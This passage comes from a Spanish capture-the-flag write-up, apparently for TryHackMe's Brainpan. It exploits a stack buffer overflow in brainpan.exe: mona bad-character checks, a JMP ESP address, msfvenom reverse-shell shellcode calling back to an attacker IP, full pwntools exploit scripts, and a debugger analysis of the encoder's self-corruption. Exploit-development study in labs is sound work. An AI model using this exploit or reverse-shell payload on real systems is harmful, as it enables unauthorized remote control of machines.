badchars </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f</span><span class="s">"</span><span class="p">
badchars </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f</span><span class="s">"</span><span class="p">
badchars </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f</span><span class="s">"</span><span class="p">
badchars </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f</span><span class="s">"</span><span class="p">
badchars </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf</span><span class="s">"</span><span class="p">
badchars </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf</span><span class="s">"</span><span class="p">
badchars </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff</span><span class="s">"  </span><span class="p">

payload </span><span class="o">= </span><span class="p">junk </span><span class="o">+ </span><span class="p">eip </span><span class="o">+ </span><span class="p">badchars

shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"192.168.100.5"</span><span class="p">, </span><span class="mi">9999</span><span class="p">)

shell.sendline(payload)
shell.close()</span>
</code></pre></div></div><br>

<p class="plain-text">Enviamos los caracteres y lo que nos interesa para comparar es la dirección del <code class="language-plaintext highlighter-rouge">ESP</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ python3 </span><span class="p">exploit.py
[</span><span class="ve">+</span><span class="p">] Opening connection to 192.168.100.5 on port 9999: Done  
[</span><span class="az">*</span><span class="p">] Closed connection to 192.168.100.5 port 9999</span>
</code></pre></div></div><br>

<p class="plain-text">Lo siguiente es con <code class="language-plaintext highlighter-rouge">mona</code> comparar el <code class="language-plaintext highlighter-rouge">.bin</code> que nos creo con la dirección del <code class="language-plaintext highlighter-rouge">ESP</code> actual, como resultado nos muestra que se corrompe despues de <code class="language-plaintext highlighter-rouge">1</code> byte quiere decir que el <code class="language-plaintext highlighter-rouge">00</code> esta corrompiendo el resto de caracteres que estan delante de el</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">mona("compare -f bytearray.bin -a ESP")</span>
</code></pre></div></div><br>
<a href="/tryhackme/brainpan/10.png" target="_blank"><div><p><img src="/tryhackme/brainpan/10.png"></p></div></a>

<p class="plain-text">Creamos un nuevo <code class="language-plaintext highlighter-rouge">bytearray</code> esta vez quitando el <code class="language-plaintext highlighter-rouge">\x00</code> que vimos es un badchar</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">mona("bytearray -cpb '\\x00'")</span>
</code></pre></div></div><br>
<a href="/tryhackme/brainpan/11.png" target="_blank"><div><p><img src="/tryhackme/brainpan/11.png"></p></div></a>

<p class="plain-text">Modificamos el script ahora con el nuevo <code class="language-plaintext highlighter-rouge">bytearray</code> que no incluye el caracter <code class="language-plaintext highlighter-rouge">\x00</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python3
</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote

offset </span><span class="o">=</span><span class="mi"> 524</span><span class="p">
junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="p">offset
eip </span><span class="o">= </span><span class="no">b</span><span class="s">"B" </span><span class="o">* </span><span class="mi">4</span><span class="p">

badchars </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
badchars </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20</span><span class="s">"</span><span class="p">
badchars </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40</span><span class="s">"</span><span class="p">
badchars </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60</span><span class="s">"</span><span class="p">
badchars </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80</span><span class="s">"</span><span class="p">
badchars </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0</span><span class="s">"</span><span class="p">
badchars </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0</span><span class="s">"</span><span class="p">
badchars </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0</span><span class="s">"</span><span class="p">  
badchars </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff</span><span class="s">"  </span><span class="p">

payload </span><span class="o">= </span><span class="p">junk </span><span class="o">+ </span><span class="p">eip </span><span class="o">+ </span><span class="p">badchars

shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"192.168.100.5"</span><span class="p">, </span><span class="mi">9999</span><span class="p">)

shell.sendline(payload)
shell.close()</span>
</code></pre></div></div><br>

<p class="plain-text">Enviamos y al volver a hacer el <code class="language-plaintext highlighter-rouge">mona compare</code> podemos ver <code class="language-plaintext highlighter-rouge">unmodified</code> quiere decir que todos los caracteres enviados se procesaron correctamente en el programa</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ python3 </span><span class="p">exploit.py
[</span><span class="ve">+</span><span class="p">] Opening connection to 192.168.100.5 on port 9999: Done  
[</span><span class="az">*</span><span class="p">] Closed connection to 192.168.100.5 port 9999</span>
</code></pre></div></div><br>
<a href="/tryhackme/brainpan/12.png" target="_blank"><div><p><img src="/tryhackme/brainpan/12.png"></p></div></a>

<p class="plain-text">Listando los modulos con <code class="language-plaintext highlighter-rouge">mona</code> encontramos que solo esta <code class="language-plaintext highlighter-rouge">brainpan.exe</code> sin nunguna proteccion, asi que podemos inyectar <code class="language-plaintext highlighter-rouge">shellcode</code> malicioso en la pila</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">mona("modules")</span>
</code></pre></div></div><br>

<a href="/tryhackme/brainpan/13.png" target="_blank"><div><p><img src="/tryhackme/brainpan/13.png"></p></div></a>

<p class="plain-text">Para llegar a la pila donde enviaremos el shellcode para que se interprete necesitamos una dirección que ejecute la instrucción <code class="language-plaintext highlighter-rouge">JMP ESP</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">mona("jmp -r esp -m brainpan.exe")</span>
</code></pre></div></div><br>
<a href="/tryhackme/brainpan/14.png" target="_blank"><div><p><img src="/tryhackme/brainpan/14.png"></p></div></a>

<p class="plain-text">Iniciamos un script definiendo el <code class="language-plaintext highlighter-rouge">junk</code> y la direccion que ejecuta el <code class="language-plaintext highlighter-rouge">JMP ESP</code></P>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python3
</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote, p32

offset </span><span class="o">= </span><span class="mi">524</span><span class="p">
junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="p">offset

jmpesp </span><span class="o">= </span><span class="p">p32(</span><span class="mi">0x311712f3</span><span class="p">)</span>
</code></pre></div></div><br>

<p class="plain-text">Con <code class="language-plaintext highlighter-rouge">msfvenom</code> crearemos un <code class="language-plaintext highlighter-rouge">shellcode</code> que nos envie una <code class="language-plaintext highlighter-rouge">shell</code> a nuestro equipo</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">-p windows/shell_reverse_tcp    </span><span class="c1"># Indica la plataforma y el payload  </span><span class="p">
LHOST=192.168.100.85            </span><span class="c1"># Indica el host del atacante</span><span class="p">
LPORT=443                       </span><span class="c1"># Indica el puerto del atacante</span><span class="p">
EXITFUNC=thread                 </span><span class="c1"># Indica que se ejecutara en un hilo  </span><span class="p">
-b '\x00'                       </span><span class="c1"># Indica todos los badchars</span><span class="p">
-f python                       </span><span class="c1"># Indica el formato del shellcode</span><span class="p">
-v shellcode                    </span><span class="c1"># Indica el nombre de la variable  </span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ msfvenom</span><span class="p"> -p windows/shell_reverse_tcp LHOST=192.168.100.85 LPORT=443 EXITFUNC=thread -b </span><span class="am">'\x00'</span><span class="p"> -f python -v shellcode  
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of python file: 1965 bytes
shellcode =  b""
shellcode += b"\xda\xc2\xd9\x74\x24\xf4\x58\xbd\x91\x4d\xed"
shellcode += b"\x34\x33\xc9\xb1\x52\x83\xe8\xfc\x31\x68\x13"
shellcode += b"\x03\xf9\x5e\x0f\xc1\x05\x88\x4d\x2a\xf5\x49"
shellcode += b"\x32\xa2\x10\x78\x72\xd0\x51\x2b\x42\x92\x37"
shellcode += b"\xc0\x29\xf6\xa3\x53\x5f\xdf\xc4\xd4\xea\x39"
shellcode += b"\xeb\xe5\x47\x79\x6a\x66\x9a\xae\x4c\x57\x55"
shellcode += b"\xa3\x8d\x90\x88\x4e\xdf\x49\xc6\xfd\xcf\xfe"
shellcode += b"\x92\x3d\x64\x4c\x32\x46\x99\x05\x35\x67\x0c"
shellcode += b"\x1d\x6c\xa7\xaf\xf2\x04\xee\xb7\x17\x20\xb8"
shellcode += b"\x4c\xe3\xde\x3b\x84\x3d\x1e\x97\xe9\xf1\xed"
shellcode += b"\xe9\x2e\x35\x0e\x9c\x46\x45\xb3\xa7\x9d\x37"
shellcode += b"\x6f\x2d\x05\x9f\xe4\x95\xe1\x21\x28\x43\x62"
shellcode += b"\x2d\x85\x07\x2c\x32\x18\xcb\x47\x4e\x91\xea"
shellcode += b"\x87\xc6\xe1\xc8\x03\x82\xb2\x71\x12\x6e\x14"
shellcode += b"\x8d\x44\xd1\xc9\x2b\x0f\xfc\x1e\x46\x52\x69"
shellcode += b"\xd2\x6b\x6c\x69\x7c\xfb\x1f\x5b\x23\x57\xb7"
shellcode += b"\xd7\xac\x71\x40\x17\x87\xc6\xde\xe6\x28\x37"
shellcode += b"\xf7\x2c\x7c\x67\x6f\x84\xfd\xec\x6f\x29\x28"
shellcode += b"\xa2\x3f\x85\x83\x03\xef\x65\x74\xec\xe5\x69"
shellcode += b"\xab\x0c\x06\xa0\xc4\xa7\xfd\x23\x2b\x9f\x99"
shellcode += b"\xe6\xc3\xe2\x61\x08\xaf\x6a\x87\x60\xdf\x3a"
shellcode += b"\x10\x1d\x46\x67\xea\xbc\x87\xbd\x97\xff\x0c"
shellcode += b"\x32\x68\xb1\xe4\x3f\x7a\x26\x05\x0a\x20\xe1"
shellcode += b"\x1a\xa0\x4c\x6d\x88\x2f\x8c\xf8\xb1\xe7\xdb"
shellcode += b"\xad\x04\xfe\x89\x43\x3e\xa8\xaf\x99\xa6\x93"
shellcode += b"\x6b\x46\x1b\x1d\x72\x0b\x27\x39\x64\xd5\xa8"
shellcode += b"\x05\xd0\x89\xfe\xd3\x8e\x6f\xa9\x95\x78\x26"
shellcode += b"\x06\x7c\xec\xbf\x64\xbf\x6a\xc0\xa0\x49\x92"
shellcode += b"\x71\x1d\x0c\xad\xbe\xc9\x98\xd6\xa2\x69\x66"
shellcode += b"\x0d\x67\x99\x2d\x0f\xce\x32\xe8\xda\x52\x5f"
shellcode += b"\x0b\x31\x90\x66\x88\xb3\x69\x9d\x90\xb6\x6c"
shellcode += b"\xd9\x16\x2b\x1d\x72\xf3\x4b\xb2\x73\xd6"</span>
</code></pre></div></div><br>

<p class="plain-text">Agregamos esto al script además de la conexión para enviar todo nuestro <code class="language-plaintext highlighter-rouge">payload</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python3
</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote, p32

offset </span><span class="o">= </span><span class="mi">524</span><span class="p">
junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A"</span><span class="o"> * </span><span class="p">offset

jmpesp </span><span class="o">= </span><span class="p">p32(</span><span class="mi">0x311712f3</span><span class="p">)</span><span class="p">

shellcode </span><span class="o">= </span><span class="no"> b</span><span class="s">"</span><span class="mi"></span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xda\xc2\xd9\x74\x24\xf4\x58\xbd\x91\x4d\xed</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x34\x33\xc9\xb1\x52\x83\xe8\xfc\x31\x68\x13</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x03\xf9\x5e\x0f\xc1\x05\x88\x4d\x2a\xf5\x49</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x32\xa2\x10\x78\x72\xd0\x51\x2b\x42\x92\x37</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xc0\x29\xf6\xa3\x53\x5f\xdf\xc4\xd4\xea\x39</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xeb\xe5\x47\x79\x6a\x66\x9a\xae\x4c\x57\x55</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xa3\x8d\x90\x88\x4e\xdf\x49\xc6\xfd\xcf\xfe</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x92\x3d\x64\x4c\x32\x46\x99\x05\x35\x67\x0c</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x1d\x6c\xa7\xaf\xf2\x04\xee\xb7\x17\x20\xb8</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x4c\xe3\xde\x3b\x84\x3d\x1e\x97\xe9\xf1\xed</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xe9\x2e\x35\x0e\x9c\x46\x45\xb3\xa7\x9d\x37</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x6f\x2d\x05\x9f\xe4\x95\xe1\x21\x28\x43\x62</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x2d\x85\x07\x2c\x32\x18\xcb\x47\x4e\x91\xea</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x87\xc6\xe1\xc8\x03\x82\xb2\x71\x12\x6e\x14</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x8d\x44\xd1\xc9\x2b\x0f\xfc\x1e\x46\x52\x69</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xd2\x6b\x6c\x69\x7c\xfb\x1f\x5b\x23\x57\xb7</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xd7\xac\x71\x40\x17\x87\xc6\xde\xe6\x28\x37</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xf7\x2c\x7c\x67\x6f\x84\xfd\xec\x6f\x29\x28</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xa2\x3f\x85\x83\x03\xef\x65\x74\xec\xe5\x69</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xab\x0c\x06\xa0\xc4\xa7\xfd\x23\x2b\x9f\x99</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xe6\xc3\xe2\x61\x08\xaf\x6a\x87\x60\xdf\x3a</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x10\x1d\x46\x67\xea\xbc\x87\xbd\x97\xff\x0c</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x32\x68\xb1\xe4\x3f\x7a\x26\x05\x0a\x20\xe1</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x1a\xa0\x4c\x6d\x88\x2f\x8c\xf8\xb1\xe7\xdb</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xad\x04\xfe\x89\x43\x3e\xa8\xaf\x99\xa6\x93</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x6b\x46\x1b\x1d\x72\x0b\x27\x39\x64\xd5\xa8</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x05\xd0\x89\xfe\xd3\x8e\x6f\xa9\x95\x78\x26</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x06\x7c\xec\xbf\x64\xbf\x6a\xc0\xa0\x49\x92</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x71\x1d\x0c\xad\xbe\xc9\x98\xd6\xa2\x69\x66</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x0d\x67\x99\x2d\x0f\xce\x32\xe8\xda\x52\x5f</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x0b\x31\x90\x66\x88\xb3\x69\x9d\x90\xb6\x6c</span><span class="s">"</span><span class="p">  
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xd9\x16\x2b\x1d\x72\xf3\x4b\xb2\x73\xd6</span><span class="s">"</span><span class="p">

payload </span><span class="o">= </span><span class="p">junk </span><span class="o">+ </span><span class="p">jmpesp </span><span class="o">+ </span><span class="p">shellcode

shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"192.168.100.5"</span><span class="p">, </span><span class="mi">9999</span><span class="p">)

shell.sendline(payload)
shell.close()</span>
</code></pre></div></div><br>

<p class="plain-text">Nos ponemos en escucha con <code class="language-plaintext highlighter-rouge">netcat</code> y corremos el <code class="language-plaintext highlighter-rouge">exe</code> desde una shell normal</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ sudo netcat</span><span class="p"> -lvnp 443
Listening on 0.0.0.0 443  </span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">PS C:\Users\pc1\Desktop> </span><span class="am">.\brainpan.exe  </span><span class="p">
[+] initializing winsock...done.
[+] server socket created.
[+] bind done on port 9999
[+] waiting for connections.</span>
</code></pre></div></div><br>

<p class="plain-text">Ejecutamos el <code class="language-plaintext highlighter-rouge">exploit</code> y el programa corrompe sin embargo <code class="language-plaintext highlighter-rouge">no</code> recibimos una shell</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ python3 </span><span class="p">exploit.py
[</span><span class="ve">+</span><span class="p">] Opening connection to 192.168.100.5 on port 9999: Done  
[</span><span class="az">*</span><span class="p">] Closed connection to 192.168.100.5 port 9999</span>
</code></pre></div></div><br>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ sudo netcat</span><span class="p"> -lvnp 443
Listening on 0.0.0.0 443  </span>
</code></pre></div></div><br>

</section>

<section class="post" id="shellcode">
<br><h3 class="post-title">Shellcode Analisis</h3><br>

<p class="plain-text">Para no solo usar <code class="language-plaintext highlighter-rouge">nops</code> o desplazar la pila porque si, lo que haremos sera analizar las instrucciones de las primeras <code class="language-plaintext highlighter-rouge">2</code> lineas del <code class="language-plaintext highlighter-rouge">shellcode</code> creado con <code class="language-plaintext highlighter-rouge">shikata_ga_nai</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="s">"</span><span class="mi">\xda\xc2\xd9\x74\x24\xf4\x58\xbd\x91\x4d\xed</span><span class="s">"  
"</span><span class="mi">\x34\x33\xc9\xb1\x52\x83\xe8\xfc\x31\x68\x13</span><span class="s">"  </span>
</code></pre></div></div><br>

<p class="plain-text">Para verlo en ensamblador podemos usar el <code class="language-plaintext highlighter-rouge">debugger</code>, enviamos nuestra petición y haciendo un <code class="language-plaintext highlighter-rouge">desensamblado</code> al <code class="language-plaintext highlighter-rouge">ESP</code> podemos ver las instrucciones que ejecuta</p>
<a href="/tryhackme/brainpan/18.png" target="_blank"><div><p><img src="/tryhackme/brainpan/18.png"></p></div></a>

<p class="plain-text">Las primeras 2 lineas shellcode <code class="language-plaintext highlighter-rouge">desensamblado</code> ejecutan las siguientes instrucciones</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">DAC2             </span><span class="o">fcmovb </span><span class="p">st(</span><span class="mi">0</span><span class="p">),st(</span><span class="mi">2</span><span class="p">)
D97424 F4        </span><span class="o">fnstenv </span><span class="na">m28 ptr </span><span class="mi">ss</span><span class="p">:[</span><span class="mi">esp</span><span class="o">-</span><span class="na">C</span><span class="p">]
58               </span><span class="o">pop </span><span class="mi">eax</span><span class="p">
BD 914DED34      </span><span class="o">mov </span><span class="mi">ebp</span><span class="p">,34ED4D91
33C9             </span><span class="o">xor </span><span class="mi">ecx</span><span class="p">,</span><span class="mi">ecx</span><span class="p">
B1 52            </span><span class="o">mov </span><span class="mi">cl</span><span class="p">,</span><span class="mi">52</span><span class="p">
83E8 FC          </span><span class="o">sub </span><span class="mi">eax</span><span class="p">,</span><span class="na">FFFFFFFC</span><span class="p">
3168 13          </span><span class="o">xor </span><span class="no">dword </span><span class="na">ptr </span><span class="mi">ds</span><span class="p">:[</span><span class="mi">eax</span><span class="o">+</span><span class="mi">13</span><span class="p">],</span><span class="mi">ebp</span>
</code></pre></div></div><br>

<p class="plain-text">El <code class="language-plaintext highlighter-rouge">problema</code> es bastante evidente, <code class="language-plaintext highlighter-rouge">fnstenv</code> esta almacenando <code class="language-plaintext highlighter-rouge">28</code> bytes del estado de la FPU <code class="language-plaintext highlighter-rouge">12</code> bytes antes del <code class="language-plaintext highlighter-rouge">ESP</code>, pero las instrucciones del shellcode inician en el <code class="language-plaintext highlighter-rouge">ESP</code> por lo que al escribirlo los 16 bytes restantes de los <code class="language-plaintext highlighter-rouge">28</code> a escribir sobreescriben el shellcode, resumiendo podriamos decir que el <code class="language-plaintext highlighter-rouge">shellcode</code> se corrompe a si mismo</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">D97424 F4        </span><span class="o">fnstenv </span><span class="na">m28 ptr </span><span class="mi">ss</span><span class="p">:[</span><span class="mi">esp</span><span class="o">-</span><span class="na">C</span><span class="p">]</span>
</code></pre></div></div><br>

<p class="plain-text">Volviendo al <code class="language-plaintext highlighter-rouge">debugger</code> podemos ver que despues de ejecutar el <code class="language-plaintext highlighter-rouge">fnstenv</code> sobreescribe varias de nuestras instrucciones por el estado del <code class="language-plaintext highlighter-rouge">FPU</code>, por lo que EIP queda en <code class="language-plaintext highlighter-rouge">0000</code> que al intentar ejecutar nos llevara a un claro <code class="language-plaintext highlighter-rouge">ACCESS_VIOLATION</code></p>
<a href="/tryhackme/brainpan/9.png" target="_blank"><div><p><img src="/tryhackme/brainpan/9.png"></p></div></a>

<p class="plain-text">Hay varias soluciones la primera y la mas sencilla es enviar antes <code class="language-plaintext highlighter-rouge">16</code> nops o <code class="language-plaintext highlighter-rouge">0x90</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python3
</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote, p32, asm

offset </span><span class="o">= </span><span class="mi">524</span><span class="p">
junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A"</span><span class="o"> * </span><span class="p">offset
nops </span><span class="o">= </span><span class="p">asm(</span><span class="s">"nop"</span><span class="p">) </span><span class="o">* </span><span class="mi">16</span><span class="p">

jmpesp </span><span class="o">= </span><span class="p">p32(</span><span class="mi">0x311712f3</span><span class="p">)</span><span class="p">

shellcode </span><span class="o">= </span><span class="no"> b</span><span class="s">"</span><span class="mi"></span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xda\xc2\xd9\x74\x24\xf4\x58\xbd\x91\x4d\xed</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x34\x33\xc9\xb1\x52\x83\xe8\xfc\x31\x68\x13</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x03\xf9\x5e\x0f\xc1\x05\x88\x4d\x2a\xf5\x49</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x32\xa2\x10\x78\x72\xd0\x51\x2b\x42\x92\x37</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xc0\x29\xf6\xa3\x53\x5f\xdf\xc4\xd4\xea\x39</span><span class="s">"</span><span class="p">
